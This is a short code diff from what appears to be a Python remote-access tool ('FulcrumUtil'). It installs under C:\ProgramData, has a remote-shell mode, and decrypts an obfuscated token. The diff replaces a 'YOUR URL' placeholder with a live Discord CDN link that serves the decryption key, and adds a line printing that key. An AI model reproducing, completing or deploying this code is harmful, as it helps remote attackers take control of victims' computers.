@@ -23,8 +23,7 @@ import threading
 FLAG_PATH = "C:\\ProgramData\\FUC Cache"
 INSTALL_PATH = "C:\\ProgramData\\FUC HUB"
 
-DECRYPTION_KEY_URL = "YOUR URL"
-
+DECRYPTION_KEY_URL = "https://cdn.discordapp.com/attachments/1274832417898627134/1283497162545692823/key.key?ex=66e33561&is=66e1e3e1&hm=5ced91f6290c0f173bcdadece01083b00951386e1871937ac4d98c52b9c5c167&"
 first_execution = False
 
 # default(waiting for commands) shell(in remote shell)
@@ -323,6 +322,7 @@ class FulcrumUtil:
 
         with open("key.key", "rb") as f:
             key = f.readline()
+            print(key)
             cipher = Fernet(key)
             # remove obfuscation
             decrypted_token = token.swapcase()[4:-4].encode()
